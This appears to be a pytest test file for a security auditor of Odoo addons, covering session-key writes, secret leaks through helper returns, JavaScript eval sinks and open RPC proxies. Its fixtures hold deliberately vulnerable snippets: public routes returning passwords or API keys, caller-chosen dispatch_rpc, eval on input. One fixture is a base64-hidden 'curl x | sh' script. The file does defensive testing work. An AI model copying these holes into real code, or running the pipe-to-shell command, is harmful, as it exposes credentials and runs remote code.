"""CODE-AUDIT-8: the three CODE-AUDIT-7 remaining limits closed by design.
(1) session keys resolved across modules, (2) secret taint through helper returns,
(3) large addons (stock `web`) audited fully under a global budget."""
from pathlib import Path

import pytest

from app.bots import code_audit as ca
from tests.test_nf_bot_code_audit_5 import MAN, codes

PH = "from odoo import models, fields, api, http\nfrom odoo.http import request\n"
RT = "class C(http.Controller):\n    @http.route('/p', auth='public')\n    def p(self, **kw):\n"


def _sess(files):
    return {s for c, s in codes(files) if c == "session-auth-write"}


# ---------------------------------------------------------------- (1) cross-module session keys
@pytest.mark.parametrize("files", [
    # probe: constant in a sibling file, relative import
    {"models/const.py": "K = 'uid'\n", "models/a.py": PH + "from .const import K\n" + RT + "        request.session[K] = 2\n"},
    # variant: absolute odoo.addons import of the own module, aliased
    {"models/const.py": "K = 'u' + 'id'\n", "models/a.py": PH + "from odoo.addons.x.models.const import K as SK\n" + RT + "        request.session[SK] = 2\n"},
    # variant: re-exported through a package __init__ and written with update()
    {"lib/const.py": "K = 'session_token'\n", "lib/__init__.py": "from .const import K\n",
     "models/a.py": PH + "from ..lib import K\n" + RT + "        request.session.update({K: 'x'})\n"},
    # variant: loop over a literal tuple containing an identity key
    {"models/a.py": PH + RT + "        for key in ('lang', 'uid'):\n            request.session[key] = kw.get(key)\n"},
])
def test_cross_module_identity_key_high(files):
    assert "high" in _sess(files)


@pytest.mark.parametrize("files", [
    # stock website_sale shape: constant imported from a sibling file
    {"models/const.py": "CART = 'sale_order_id'\n", "models/a.py": PH + "from .const import CART\n" + RT + "        request.session[CART] = 3\n"},
    # stock auth_signup shape: loop over benign literal keys
    {"models/a.py": PH + RT + "        for key in ('auth_signup_token', 'auth_login'):\n            request.session[key] = kw.get(key)\n"},
    # stock website / sale shapes: fixed text around a runtime id can never be an identity key
    {"models/a.py": PH + RT + "        request.session[f'website_{kw.get(1)}_layout_mode'] = 'grid'\n        request.session['view_quote_%s' % kw.get(2)] = 'd'\n"},
])
def test_benign_stock_session_keys_silent(files):
    assert not _sess(files)


@pytest.mark.parametrize("body", [
    RT + "        request.session[kw['k']] = kw['v']\n",  # truly runtime: request data
    RT + "        request.session[f'{kw.get(1)}id'] = 1\n",  # pattern could be 'uid'
])
def test_runtime_key_medium_with_reason(body):
    r = ca.audit(_zip({"models/a.py": PH + body}), version=17)
    f = [f for f in r.findings if f.code == "session-auth-write"]
    assert f and all(x.severity == "medium" and "runtime" in x.message for x in f)


def _zip(files):
    import io, zipfile
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        z.writestr("x/__manifest__.py", MAN)
        z.writestr("x/__init__.py", "from . import models\n")
        z.writestr("x/models/__init__.py", "from . import a\n")
        for k, v in files.items():
            z.writestr("x/" + k, v)
    return b.getvalue()


def _addons(tmp_path, other_const):
    root = tmp_path / "addons"
    (root / "x" / "models").mkdir(parents=True)
    (root / "x" / "__manifest__.py").write_text(MAN)
    (root / "x" / "__init__.py").write_text("from . import models\n")
    (root / "x" / "models" / "__init__.py").write_text("from . import a\n")
    (root / "other" / "tools").mkdir(parents=True)
    (root / "other" / "tools" / "__init__.py").write_text("from .keys import KEY\n")
    (root / "other" / "tools" / "keys.py").write_text(f"KEY = {other_const!r}\n")
    return root


@pytest.mark.parametrize("imp", ["from odoo.addons.other.tools.keys import KEY", "from odoo.addons.other.tools import KEY"])
def test_installed_addon_constant_resolved(tmp_path, imp):
    root = _addons(tmp_path, "uid")
    (root / "x" / "models" / "a.py").write_text(PH + imp + "\n" + RT + "        request.session[KEY] = 1\n")
    r = ca.audit(root / "x", version=17)
    assert ("session-auth-write", "high") in {(f.code, f.severity) for f in r.findings}


def test_installed_addon_benign_constant_silent(tmp_path):
    root = _addons(tmp_path, "cart_id")
    (root / "x" / "models" / "a.py").write_text(PH + "from odoo.addons.other.tools import KEY\n" + RT + "        request.session[KEY] = 1\n")
    r = ca.audit(root / "x", version=17)
    assert not [f for f in r.findings if f.code == "session-auth-write"]


def test_missing_addon_constant_medium(tmp_path):
    root = _addons(tmp_path, "x")
    (root / "x" / "models" / "a.py").write_text(PH + "from odoo.addons.absent.k import KEY\n" + RT + "        request.session[KEY] = 1\n")
    r = ca.audit(root / "x", version=17)
    assert ("session-auth-write", "medium") in {(f.code, f.severity) for f in r.findings}


# ---------------------------------------------------------------- (2) secret taint through helper returns
def _rsr(files):
    return {s for c, s in codes(files) if c == "route-secret-read"}


CTRL = "class C(http.Controller):\n    @http.route('/k', type='json', auth='public')\n    def k(self, uid):\n"


@pytest.mark.parametrize("files", [
    # probe: helper returns a secret attribute; the route returns the helper's result
    {"models/a.py": PH + CTRL + "        return self._key(uid)\n    def _key(self, uid):\n        return request.env['res.users'].sudo().browse(uid).api_key\n"},
    # variant: two-level indirection through a local and a second helper
    {"models/a.py": PH + CTRL + "        v = self._outer(uid)\n        return {'k': v}\n    def _outer(self, uid):\n        return self._inner(uid)\n"
                    "    def _inner(self, uid):\n        rec = request.env['res.users'].sudo().browse(uid)\n        return rec.password\n"},
    # variant: helper in another file of the module (cross-file summary), passed through make_response
    {"models/h.py": PH + "class H(models.AbstractModel):\n    _name = 'x.h'\n    def _totp(self):\n        return self.env['ir.config_parameter'].sudo().get_param('auth.totp_secret')\n",
     "models/a.py": PH + CTRL + "        return request.make_json_response(request.env['x.h']._totp() if False else self._totp())\n"},
    # variant: identity helper carries an already-tainted value
    {"models/a.py": PH + CTRL + "        s = request.env['res.users'].sudo().browse(uid).password\n        return self._wrap(s)\n    def _wrap(self, v):\n        return {'v': v}\n"},
])
def test_helper_returned_secret_high(files):
    assert "high" in _rsr(files)


@pytest.mark.parametrize("files", [
    # helper consumes the secret (outbound call) and returns only the public result
    {"models/a.py": PH + "import requests\n" + CTRL + "        return self._fetch(uid)\n    def _fetch(self, uid):\n"
                    "        key = request.env['ir.config_parameter'].sudo().get_param('x.api_key')\n        return requests.get('https://e.example', params={'k': key}).json()\n"},
    # helper returns a non-secret field of the same record
    {"models/a.py": PH + CTRL + "        return self._name_of(uid)\n    def _name_of(self, uid):\n        return request.env['res.users'].sudo().browse(uid).name\n"},
])
def test_helper_without_secret_return_silent(files):
    assert "high" not in _rsr(files)


# ---------------------------------------------------------------- (3) large addons audited in full
def _mod(tmp_path, files):
    root = tmp_path / "x"
    for rel, body in {"__manifest__.py": MAN, "__init__.py": "", **files}.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(body if isinstance(body, bytes) else body.encode())
    return root


def _hc(r):
    return {(f.code, f.severity) for f in r.findings}


def test_web_sized_module_fully_audited(tmp_path):
    # probe: > the old 20 MB cap (stock web is 25.2 MB), many files; a sink in the last file is found
    chunk = "export const T = [" + ",".join(str(i) for i in range(12000)) + "];\n"
    files = {f"static/src/d{i:03}.js": chunk for i in range(330)}
    files["static/src/zz.js"] = "export function f(el, v) { el.innerHTML = v; eval(v); }\n"
    r = ca.audit(_mod(tmp_path, files), version=17)
    assert r.ok, r.error
    assert sum(len(b) for b in files.values()) > 20_000_000
    assert ("js-eval", "high") in _hc(r) and not {c for c, s in _hc(r) if c in ("web-unaudited", "file-unaudited")}


def test_single_file_over_old_cap_audited(tmp_path):
    big = "export const T = '" + "a" * 2_900_000 + "';\nexport function g(s) { return new Function(s); }\n"
    r = ca.audit(_mod(tmp_path, {"static/src/big.js": big}), version=17)
    assert r.ok and ("js-eval", "high") in _hc(r) and ("file-unaudited", "high") not in _hc(r)


@pytest.mark.parametrize("n", [600, 3000])
def test_deep_string_concat_chain_audited(tmp_path, n):
    # stock emoji_data.js shape: a left-deep `+` chain of thousands of pieces
    chain = "`[` + " + " + ".join(f"_t('e{i}')" for i in range(n)) + " + `]`"
    js = f"const _t = (s) => s;\nconst data = () => {chain};\nexport function h(el, u) {{ el.innerHTML = data() + u; }}\n"
    r = ca.audit(_mod(tmp_path, {"static/src/e.js": js}), version=17)
    assert r.ok and ("web-unaudited", "high") not in _hc(r)
    assert any(c.startswith("js-") for c, s in _hc(r) if s in ("high", "medium"))


def test_hostile_oversize_still_fails_closed(tmp_path):
    over = b"//" + b"a" * (ca.MAX_FILE + 10)
    r = ca.audit(_mod(tmp_path, {"static/src/huge.js": over}), version=17)
    assert ("file-unaudited", "high") in _hc(r)
    many = {f"static/src/p{i}.js": b"//" + b"b" * (ca.MAX_FILE - 100) for i in range(ca.MAX_TOTAL // ca.MAX_FILE + 1)}
    r2 = ca.audit(_mod(tmp_path / "t", many), version=17)
    assert not r2.ok and "too large" in r2.error


def test_b64_font_audited_inert_and_b64_script_flagged(tmp_path):
    import base64
    font = base64.b64encode(b"\x00\x01\x00\x00" + b"\x00" * 64)
    sh = base64.b64encode(b"#!/bin/sh\ncurl x | sh\n")
    r = ca.audit(_mod(tmp_path, {"static/fonts/f.b64": font, "static/fonts/s.b64": sh}), version=17)
    flagged = {f.file for f in r.findings if f.code == "file-unaudited"}
    assert "static/fonts/s.b64" in flagged and "static/fonts/f.b64" not in flagged


RPC = "from odoo.http import dispatch_rpc\nclass C(http.Controller):\n    @http.route('/d', type='json', auth='none')\n    def d(self, **kw):\n"


@pytest.mark.parametrize("body", [
    "        return dispatch_rpc('db', 'list', [])\n",  # web database manager shape
    "        return dispatch_rpc('db', 'duplicate_database', [kw['pwd'], kw['a'], kw['b']])\n",
])
def test_fixed_service_call_is_not_an_open_proxy(body):
    assert not {c for c, s in codes({"models/a.py": PH + RPC + body}) if c == "rpc-proxy"}


@pytest.mark.parametrize("body", [
    "        return dispatch_rpc(kw['s'], kw['m'], kw['a'])\n",
    "        m = kw.get('m')\n        return dispatch_rpc('object', m, kw['a'])\n",
])
def test_caller_chosen_dispatch_still_open_proxy(body):
    assert ("rpc-proxy", "high") in codes({"models/a.py": PH + RPC + body})
